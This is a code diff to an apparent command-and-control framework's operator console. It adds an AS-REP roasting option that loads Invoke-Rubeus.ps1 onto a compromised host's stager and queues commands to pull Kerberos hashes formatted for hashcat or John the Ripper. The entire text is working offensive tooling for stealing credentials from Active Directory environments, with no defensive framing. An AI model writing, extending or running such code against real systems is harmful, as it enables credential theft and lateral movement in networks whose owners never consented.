@@ -969,6 +969,36 @@ class mymainclass():
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.KERBER)
                     continue
 
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_ASREP:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    if ("Invoke-Rubeus.ps1" not in self.__t_myserver.get_psloadlist(user_input_stager)):
+
+                        #load ps
+                        t_psloader = ps_loader()
+                        t_result = t_psloader.load_ps("Invoke-Rubeus.ps1")
+                        #call psrun with tag psload
+                        self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+                        #update the list
+                        self.__t_myserver.add_psloadlist(user_input_stager,"Invoke-Rubeus.ps1")
+                    
+                    else:
+                        print("Rubeus already loaded")
+
+                    user_input_confirm = input("y for john, default hashcat: ")
+                    if user_input_confirm != "y":
+                        self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.ARSREP_HC)
+                    else:
+                        self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.ARSREP)
+
+                    continue
+
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
                 # menu switch
                 if command_id == self.__t_myconstant.CMD_BACK:
